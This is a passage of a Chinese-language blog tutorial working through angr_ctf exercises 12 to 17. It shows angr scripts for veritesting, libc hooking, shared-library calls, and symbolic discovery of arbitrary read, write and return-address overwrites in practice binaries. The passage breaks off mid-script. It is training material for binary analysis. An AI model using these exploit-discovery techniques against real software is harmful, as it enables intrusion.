class="hljs-title">is_successful</span>(<span class="hljs-params">state</span>):</span><br>        stdout_output = state.posix.dumps(sys.stdout.fileno())<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> stdout_output<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">should_abort</span>(<span class="hljs-params">state</span>):</span><br>        stdout_output = state.posix.dumps(sys.stdout.fileno())<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> stdout_output<br><br>    simulation.explore(find=is_successful, avoid=should_abort)<br><br>    <span class="hljs-keyword">if</span> simulation.found:<br>        solution_state = simulation.found[<span class="hljs-number">0</span>]<br><br>        solution0 = solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;solution0&#x27;</span>] <span class="hljs-comment">#从当前状态取出scanf0和scanf1</span><br>        solution1 = solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;solution1&#x27;</span>]<br><br>        solution = <span class="hljs-string">&#x27;%u %u&#x27;</span> % (solution_state.se.<span class="hljs-built_in">eval</span>(solution0), solution_state.se.<span class="hljs-built_in">eval</span>(solution1))<br>        <span class="hljs-built_in">print</span>(solution)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>我们在这个题中同样利用到了符号化函数名的方式来对一堆的<code>scanf</code>进行模拟，并将其保存在内存段里，具体函数如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;solution0&#x27;</span>] = scanf0 <span class="hljs-comment"># 将 scanf0 进行保存</span><br>solution0 = solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;solution0&#x27;</span>] <span class="hljs-comment"># 从当前状态取出 scanf0 </span><br></code></pre></td></tr></table></figure><h2 id="12-angr-veritesting">12_angr_veritesting</h2><p>在这个题目中与<code>01</code>的<code>avoid</code>来约束目标输出字符串，但是这个题目中循环的次数较大，如果直接套用<code>01</code>的脚本可能会出现路径爆炸 ( <code>angr</code>模拟执行时遍历的路径是成指数级上涨，如果都需要需要执行那么便会引发错误 )，我们之前所做的<code>hook</code>函数，添加约束条件都是有效的防止路径爆炸的操作，我们接下来采用一个新的方式来解决路径爆炸的问题：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">sm=p.factory.simulation_manager(istate,veritesting=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>这个函数让我们直接忽视循环结构，直接进行求解，一般耗时会比较长。</p><p>加入这个防止路径爆炸的脚本为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> angr<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    binary_path = <span class="hljs-string">&#x27;../program/12_angr_veritesting&#x27;</span><br>    project = angr.Project(binary_path)<br><br>    initial_state = project.factory.entry_state()<br>    simulation = project.factory.simgr(initial_state, veritesting=<span class="hljs-literal">True</span>) <span class="hljs-comment"># 设置自动合并路径</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_successful</span>(<span class="hljs-params">state</span>):</span><br>        stdout_output = state.posix.dumps(sys.stdout.fileno())<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> stdout_output<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">should_abort</span>(<span class="hljs-params">state</span>):</span><br>        stdout_output = state.posix.dumps(sys.stdout.fileno())<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> stdout_output<br><br>    simulation.explore(find=is_successful, avoid=should_abort)<br><br>    <span class="hljs-keyword">if</span> simulation.found:<br>        solution_state = simulation.found[<span class="hljs-number">0</span>]<br><br>        solution = solution_state.posix.dumps(sys.stdin.fileno())<br>        <span class="hljs-built_in">print</span>(solution)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h2 id="13-angr-static-binary">13_angr_static_binary</h2><p>这个示例的逻辑和<code>01</code>题是一样的,主要不同的地方是在于这个程序是静态链接编译的,所以程序中包含了一些<code>libc</code>的函数实现,但是这里可能会存在两个问题:</p><ol><li><p>这些函数里面隐藏一些出题人的坑;</p></li><li><p>这些函数里面的实现可能会依赖其他的系统函数或者实现方式不相同.所以<code>12</code> 题主要是让我们通过<code>Hook</code> 的方式重定向函数中被调用的<code>libc</code> 的函数</p></li></ol><p>首先,Linux 下启动main() 函数需要通过<code>__libc_start_main</code> 对程序进行初始化,然后再跳转到<code>main</code>() 函数;其次,在<code>main</code>() 函数里面调用了<code>printf</code> ,<code>scanf</code> ,<code>puts</code> ,所以我们需要通过Hook 来重定向它们.</p><p>幸运的是,我们不需要重新实现这些函数的实现,<code>Angr</code> 代码库里面已经帮我们实现了一部分<code>libc</code> 的函数库,所以我们只需要倒入它们即可.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><br><br>project = angr.Project(sys.argv[<span class="hljs-number">1</span>])<br>initial_state = project.factory.entry_state()<br>simulation = project.factory.simgr(initial_state,veritesting = <span class="hljs-literal">True</span>) <span class="hljs-comment"># 开启自动合并路径</span><br><br>project.hook(<span class="hljs-number">0x804ed40</span>, angr.SIM_PROCEDURES[<span class="hljs-string">&#x27;libc&#x27;</span>][<span class="hljs-string">&#x27;printf&#x27;</span>]()) <span class="hljs-comment"># hook库函数</span><br>project.hook(<span class="hljs-number">0x804ed80</span>, angr.SIM_PROCEDURES[<span class="hljs-string">&#x27;libc&#x27;</span>][<span class="hljs-string">&#x27;scanf&#x27;</span>]())<br>project.hook(<span class="hljs-number">0x804f350</span>, angr.SIM_PROCEDURES[<span class="hljs-string">&#x27;libc&#x27;</span>][<span class="hljs-string">&#x27;puts&#x27;</span>]())<br>project.hook(<span class="hljs-number">0x8048d10</span>, angr.SIM_PROCEDURES[<span class="hljs-string">&#x27;glibc&#x27;</span>][<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]())<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_successful</span>(<span class="hljs-params">state</span>):</span><br>  stdout_output = state.posix.dumps(sys.stdout.fileno())<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(stdout_output)  <span class="hljs-comment"># :boolean</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">should_abort</span>(<span class="hljs-params">state</span>):</span><br>  stdout_output = state.posix.dumps(sys.stdout.fileno())<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(stdout_output)  <span class="hljs-comment"># :boolean</span><br><br>simulation.explore(find = is_successful,avoid = should_abort)<br><br><span class="hljs-keyword">if</span> simulation.found :<br>  solution_state = simulation.found[<span class="hljs-number">0</span>]<br>  <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()))<br><br></code></pre></td></tr></table></figure><p>通过上述题目，我们了解到了如何将静态链接中的库函数进行<code>hook</code>，从而来获取<code>libc</code> 的函数库：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs prolog">project.hook(&lt;调用地址&gt;, angr.<span class="hljs-symbol">SIM_PROCEDURES</span>[<span class="hljs-string">&#x27;&lt;系统库名&gt;&#x27;</span>][<span class="hljs-string">&#x27;&lt;系统函数名&gt;&#x27;</span>]()) # hook库函数<br>angr.<span class="hljs-symbol">SIM_PROCEDURES</span>[ 系统库名 ] [ 系统函数名 ] ()  =&gt;  获取<span class="hljs-symbol">Angr</span> 内部实现的系统函数<br></code></pre></td></tr></table></figure><h2 id="14-angr-shared-library">14_angr_shared_library</h2><p>在编译好的程序中我们可以看到有一个<code>validate</code>函数对我们的输入进行了比较，但是进入这个函数却发现没有相关的实现方式</p><p><img src="https://s2.loli.net/2022/03/19/yf7C86Ta5RK3dVM.png" alt=""></p><p>这是因为<code>validate</code>在共享库里，即程序提供的<code>so</code>中，事实上<code>so</code>也算是一种可执行文件，但是没有经过符号链接，我们需要的便是通过<code>angr</code>加载共享库，然后伪造参数来对<code>validate</code>函数进行调用。</p><img src="https://s2.loli.net/2022/03/19/ehHok7qsmRiV3O8.png" style="zoom:100%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">argv</span>):</span><br>  path_to_binary = sys.argv[<span class="hljs-number">1</span>]  <span class="hljs-comment">#  注意我们是要load so 库而不是执行程序</span><br><br>  base = <span class="hljs-number">0x400000</span>  <span class="hljs-comment">#  base 基址是随意定的,可以随意修改</span><br>  project = angr.Project(path_to_binary, load_options=&#123;<br>    <span class="hljs-string">&#x27;main_opts&#x27;</span> : &#123;<br>      <span class="hljs-string">&#x27;custom_base_addr&#x27;</span> : base<br>    &#125;<br>  &#125;)<br><br>  buffer_pointer = claripy.BVV(<span class="hljs-number">0x3000000</span>, <span class="hljs-number">32</span>)  <span class="hljs-comment">#  创建一个buffer 指针值</span><br>  validate_function_address = base + <span class="hljs-number">0x6D7</span><br>  initial_state = project.factory.call_state(validate_function_address, buffer_pointer,claripy.BVV(<span class="hljs-number">8</span>, <span class="hljs-number">32</span>))  <span class="hljs-comment">#  调用validate_function,因为函数声明validata_function(buffer_point,buffer_length) ,所以我们构造出调用validata_function(0x3000000,0x8) .</span><br><br>  password = claripy.BVS(<span class="hljs-string">&#x27;password&#x27;</span>, <span class="hljs-number">8</span> * <span class="hljs-number">8</span>)  <span class="hljs-comment">#  创建一个求解对象,大小为8 字节</span><br>  initial_state.memory.store(buffer_pointer, password)  <span class="hljs-comment">#  保存到0x30000000</span><br><br>  simulation = project.factory.simgr(initial_state)<br><br>  simulation.explore(find = base + <span class="hljs-number">0x783</span>)  <span class="hljs-comment">#  执行到validate 函数的RETN 指令</span><br><br>  <span class="hljs-keyword">if</span> simulation.found:<br>    solution_state = simulation.found[<span class="hljs-number">0</span>]<br><br>    solution_state.add_constraints(solution_state.regs.eax != <span class="hljs-number">0</span>)  <span class="hljs-comment">#  记得,我们要求validate 函数的返回值为1 的时候就是有解的,那么我们就需要在求解的时候添加上这么一个求解约束条件EAX 不能为False .</span><br>    solution = solution_state.se.<span class="hljs-built_in">eval</span>(password)<br>    <span class="hljs-built_in">print</span>(solution)<br></code></pre></td></tr></table></figure><h2 id="15-angr-arbitrary-read">15_angr_arbitrary_read</h2><p>单纯的从程序上看的话似乎程序一直是输入错误，但是我们到栈上看输入的变量，可以发现读入了<code>20</code>个字符，但是栈空间中到<code>s</code>的距离仅有<code>16</code>，所以意味着多出来的<code>4</code>字节会覆盖<code>s</code>保存的地址，因此我们可以直接用这4字节进行替换到输出正确的地址处。</p><img src="https://s2.loli.net/2022/03/19/vPL7lbSEMUpq8zF.png" style="zoom:80%;" /><p>所以脚本可以如下进行编写：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">argv</span>):</span><br>  path_to_binary = argv[<span class="hljs-number">1</span>]<br>  project = angr.Project(path_to_binary)<br><br>  initial_state = project.factory.entry_state()<br><br>  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ReplacementScanf</span>(<span class="hljs-params">angr.SimProcedure</span>):</span>  <span class="hljs-comment">#  实现Scanf Hook 函数</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self, format_string, check_key_address,input_buffer_address</span>):</span><br>      scanf0 = claripy.BVS(<span class="hljs-string">&#x27;scanf0&#x27;</span>, <span class="hljs-number">4</span> * <span class="hljs-number">8</span>)   <span class="hljs-comment"># check_key</span><br>      scanf1 = claripy.BVS(<span class="hljs-string">&#x27;scanf1&#x27;</span>, <span class="hljs-number">20</span> * <span class="hljs-number">8</span>)  <span class="hljs-comment"># input_buffer</span><br><br>      <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> scanf1.chop(bits=<span class="hljs-number">8</span>):<br>        self.state.add_constraints(char &gt;= <span class="hljs-string">&#x27;0&#x27;</span>, char &lt;= <span class="hljs-string">&#x27;z&#x27;</span>)  <span class="hljs-comment">#  对input_buffer 的输入约束</span><br><br>      self.state.memory.store(check_key_address, scanf0, endness=project.arch.memory_endness)<br>      self.state.memory.store(input_buffer_address, scanf1,endness=project.arch.memory_endness)  <span class="hljs-comment">#  保存求解变量到指定的内存中</span><br><br>      self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;solution0&#x27;</span>] = scanf0  <span class="hljs-comment">#  保存这两个变量到state 中,后续求解需要用到</span><br>      self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;solution1&#x27;</span>] = scanf1<br><br>  scanf_symbol = <span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span><br>  project.hook_symbol(scanf_symbol, ReplacementScanf())  <span class="hljs-comment">#  Hook scanf 函数</span><br><br>  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check_puts</span>(<span class="hljs-params">state</span>):</span><br>    puts_parameter = state.memory.load(state.regs.esp + <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, endness=project.arch.memory_endness)  <span class="hljs-comment">#  获取puts() 函数的参数</span><br><br>    <span class="hljs-keyword">if</span> state.se.symbolic(puts_parameter):  <span class="hljs-comment">#  检查这个参数是否为符号化对象</span><br>      good_job_string_address = <span class="hljs-number">0x4D525854B</span><br><br>      copied_state = state.copy()  <span class="hljs-comment">#  复制执行状态上下文进行约束求解,不影响原理的执行上下文</span><br><br>      copied_state.add_constraints(puts_parameter == good_job_string_address)  <span class="hljs-comment">#  puts 的参数地址是否可以被指定为0x4D525854B ,如果可以的话,那就证明这个值是可控的</span><br><br>      <span class="hljs-keyword">if</span> copied_state.satisfiable():  <span class="hljs-comment">#  判断添加了上面这个约束是否有解</span><br>        state.add_constraints(puts_parameter == good_job_string_address)  <span class="hljs-comment">#  如果有解的话就保存到我们执行的那个状态对象</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span> <br>      <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>  simulation = project.factory.simgr(initial_state)<br>    <br>  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_successful</span>(<span class="hljs-params">state</span>):</span><br>    puts_address = <span class="hljs-number">0x8048370</span>  <span class="hljs-comment">#  当程序执行到puts() 函数时,我们就认为路径探索到了这里,然后再去通过check_puts() 判断这里是否存在漏洞,告诉Angr这是不是我们需要找的那条执行路径</span><br>    <br>    <span class="hljs-keyword">if</span> state.addr == puts_address:<br>      <span class="hljs-keyword">return</span> check_puts(state)<br>    <span class="hljs-keyword">else</span>:<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>  simulation.explore(find=is_successful)<br><br>  <span class="hljs-keyword">if</span> simulation.found:<br>    solution_state = simulation.found[<span class="hljs-number">0</span>]<br><br>    solution0 = solution_state.se.<span class="hljs-built_in">eval</span>(solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;solution0&#x27;</span>])<br>    solution1 = solution_state.se.<span class="hljs-built_in">eval</span>(solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;solution1&#x27;</span>],cast_to=<span class="hljs-built_in">bytes</span>)  <span class="hljs-comment">#  输出字符串序列化的内容</span><br><br>    <span class="hljs-built_in">print</span>(solution0,solution1)<br></code></pre></td></tr></table></figure><p>通过这个题目我们可以学习到添加对输入的约束，和复制状态的上下文，以及序列化内容转化为字符串：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">state.copy()  <span class="hljs-comment"># 复制状态上下文</span><br><br>state.satisfiable()  <span class="hljs-comment"># 判断当前的所有约束是否有解</span><br><br>solution_state.se.<span class="hljs-built_in">eval</span>(求解变量,cast_to=<span class="hljs-built_in">bytes</span>)  <span class="hljs-comment"># 序列化变量内容为字符串</span><br></code></pre></td></tr></table></figure><h2 id="16-angr-arbitrary-write">16_angr_arbitrary_write</h2><p>从程序看，其最终目的是将<code>password_buffer</code>里面的字符替换成<code>KZYRKMKE</code>，但是程序中彬没有指向<code>password_buffer</code>的变量，同时我们也发现与上一个题目一样函数存在溢出的漏洞，所以我们利用这个<code>4字节</code>溢出将目的<code>password_buffer</code>的值修改，达到输出正确的目的。</p><img src="https://s2.loli.net/2022/03/19/TwiaAsCQtbV6moY.png" style="zoom:80%;" /><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">argv</span>):</span><br>  path_to_binary = argv[<span class="hljs-number">1</span>]<br>  project = angr.Project(path_to_binary)<br>  initial_state = project.factory.entry_state()<br><br>  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ReplacementScanf</span>(<span class="hljs-params">angr.SimProcedure</span>):</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self, format_string, check_key ,input_buffer</span>):</span><br>      scanf0 = claripy.BVS(<span class="hljs-string">&#x27;scanf0&#x27;</span>, <span class="hljs-number">4</span> * <span class="hljs-number">8</span>)<br>      scanf1 = claripy.BVS(<span class="hljs-string">&#x27;scanf1&#x27;</span>, <span class="hljs-number">20</span> * <span class="hljs-number">8</span>)<br><br>      <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> scanf1.chop(bits=<span class="hljs-number">8</span>):<br>        self.state.add_constraints(char &gt;= <span class="hljs-string">&#x27;0&#x27;</span>, char &lt;= <span class="hljs-string">&#x27;z&#x27;</span>)<br><br>      self.state.memory.store(check_key, scanf0, endness=project.arch.memory_endness)<br>      self.state.memory.store(input_buffer, scanf1, endness=project.arch.memory_endness)<br><br>      self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;solution0&#x27;</span>] = scanf0<br>      self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;solution1&#x27;</span>] = scanf1<br><br>  scanf_symbol = <span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span><br>  project.hook_symbol(scanf_symbol, ReplacementScanf())<br><br>  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check_strncpy</span>(<span class="hljs-params">state</span>):</span><br>    strncpy_dest = state.memory.load(state.regs.esp + <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, endness=project.arch.memory_endness)  <span class="hljs-comment">#  获取strncpy() 的参数,strncpy_dest ..</span><br>    strncpy_src  = state.memory.load(state.regs.esp + <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, endness=project.arch.memory_endness)<br>    strncpy_len  = state.memory.load(state.regs.esp + <span class="hljs-number">12</span>, <span class="hljs-number">4</span>, endness=project.arch.memory_endness)<br>    src_contents = state.memory.load(strncpy_src, strncpy_len)  <span class="hljs-comment">#  因为参数中只保存了地址,我们需要根据这个地址去获取内容</span><br><br>    <span class="hljs-keyword">if</span> state.se.symbolic(strncpy_dest) <span class="hljs-keyword">and</span> state.se.symbolic(src_contents) :  <span class="hljs-comment">#  判断dest 和src 的内容是不是符号化对象</span><br>      <span class="hljs-keyword">if</span> state.satisfiable(extra_constraints=(src_contents[ -<span class="hljs-number">1</span> : -<span class="hljs-number">64</span> ] == <span class="hljs-string">&#x27;KZYRKMKE&#x27;</span> ,strncpy_dest == <span class="hljs-number">0x4D52584C</span>)):  <span class="hljs-comment">#  尝试求解,其中strncpy_dest == 0x4D52584C 的意思是判断dest 是否可控为password 的地址;src_contents[ -1 : -64 ] == &#x27;KZYRKMKE&#x27; 是判断input_buffer 的内容是否可控为&#x27;KZYRKMKE&#x27; ,因为这块内存是倒序,所以需要通过[ -1 : -64 ] 倒转(contentes 的内容是比特,获取8 字节的大小为:8*8 = 64),然后判断该值是否为字符串&#x27;KZYRKMKE&#x27;</span><br>        state.add_constraints(src_contents[ -<span class="hljs-number">1</span> : -<span class="hljs-number">64</span> ] == <span class="hljs-string">&#x27;KZYRKMKE&#x27;</span>,strncpy_dest == <span class="hljs-number">0x4D52584C</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>      <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>  simulation = project.factory.simgr(initial_state)<br><br>  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_successful</span>(<span class="hljs-params">state</span>):</span><br>    strncpy_address = <span class="hljs-number">0x8048410</span><br><br>    <span class="hljs-keyword">if</span> state.addr == strncpy_address:<br>      <span class="hljs-keyword">return</span> check_strncpy(state)<br>    <span class="hljs-keyword">else</span>:<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>  simulation.explore(find=is_successful)<br><br>  <span class="hljs-keyword">if</span> simulation.found:<br>    solution_state = simulation.found[<span class="hljs-number">0</span>]<br>    solution0 = solution_state.se.<span class="hljs-built_in">eval</span>(solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;solution0&#x27;</span>])<br>    solution1 = solution_state.se.<span class="hljs-built_in">eval</span>(solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;solution1&#x27;</span>],cast_to=<span class="hljs-built_in">bytes</span>)<br><br>    <span class="hljs-built_in">print</span>(solution0,solution1)<br></code></pre></td></tr></table></figure><h2 id="17-angr-arbitrary-iump">17_angr_arbitrary_iump</h2><p>一打开程序一看就只有一个输入，和一个输入错误，我们查看其函数，发现在某个地址处可以发现有输出<code>Good</code>，我们可以判断出这个是将<code>ret</code>的返回地址进行覆盖然后跳转到对应的输入正确函数地址处。</p><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">argv</span>):</span><br>  path_to_binary = argv[<span class="hljs-number">1</span>]<br>  project = angr.Project(path_to_binary)<br>  initial_state = project.factory.entry_state()<br><br>  simulation = project.factory.simgr(<br>    initial_state,<br>    save_unconstrained=<span class="hljs-literal">True</span>,<br>    stashes=&#123;<br>      <span class="hljs-string">&#x27;active&#x27;</span> : [initial_state],<br>      <span class="hljs-string">&#x27;unconstrained&#x27;</span> : [],<br>      <span class="hljs-string">&#x27;found&#x27;</span> : [],<br>      <span class="hljs-string">&#x27;not_needed&#x27;</span> : []<br>    &#125;<br>  )<br><br>  <span class="hljs-class"><span 